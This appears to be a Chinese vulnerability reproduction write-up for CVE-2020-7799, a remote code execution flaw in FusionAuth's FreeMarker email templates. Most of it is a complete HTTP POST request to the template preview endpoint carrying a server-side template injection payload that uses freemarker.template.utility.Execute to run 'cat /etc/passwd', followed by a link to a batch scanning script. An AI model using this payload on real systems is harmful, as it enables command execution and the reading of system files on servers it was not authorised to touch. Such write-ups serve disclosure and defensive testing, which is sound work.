# （CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2814](https://www.zhihuifly.com/t/topic/2814)

# （CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞

## 一、漏洞简介

在FusionAuth 1.11.0版本之前的中发现了一个问题。经过身份验证的用户允许编辑电子邮件模板（主页->设置->电子邮件模板）或主题（主页->设置->主题），可利用`freemarker.template.utility.Execute`执行任意命令

## 二、漏洞影响

## 三、复现过程

post提交

```
POST /ajax/email/template/preview HTTP/1.1
Host: www.0-sec.org:9011
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 796
DNT: 1
Connection: close
Referer: http://192.168.0.3:9011/admin/email/template/edit/2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b
Cookie: JSESSIONID=FA9DB3CBABA6B37E5336AE4B96001807; 

primeCSRFToken=kRC228UjAA4ohN_E9PW9kz0HpTlxUDCB_HVrDhBUfWU&emailTemplateId=2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b&emailTemplate.name=COPPA%20Notice&emailTemplate.defaultSubject=Notice%20of%20your%20consent&emailTemplate.fromEmail=no-reply%[40fusionauth.io](http://40fusionauth.io)&emailTemplate.defaultFromName=FusionAuth&emailTemplate.defaultTextTemplate=You%20recently%20granted%20your%20child%20consent%20in%20our%20system.%20This%20email%20is%20to%20notify%20you%20of%20this%20consent.%20If%20you%20did%20not%20grant%20this%20consent%20or%20wish%20to%20revoke%20this%20consent%2C%20click%20the%20link%20below%3A%0A%0Ahttp%3A%2F%[2Fexample.com](http://2Fexample.com)%2Fconsent%2Fmanage%0A%0A-%20FusionAuth%20Admin&emailTemplate.defaultHtmlTemplate=${“freemarker.template.utility.Execute”?new()(“cat /etc/passwd”)}} 
```

![image](img/fd796394c31241ff20aa4ff376929820.png)

### 批量检测脚本

https://github.com/ianxtianxt/CVE-2020-7799/

## 参考链接

> https://www.anquanke.com/vul/id/1910928

> https://cert.360.cn/warning/detail?id=207275e27a6e7ee85a43a6eb5cf5fc69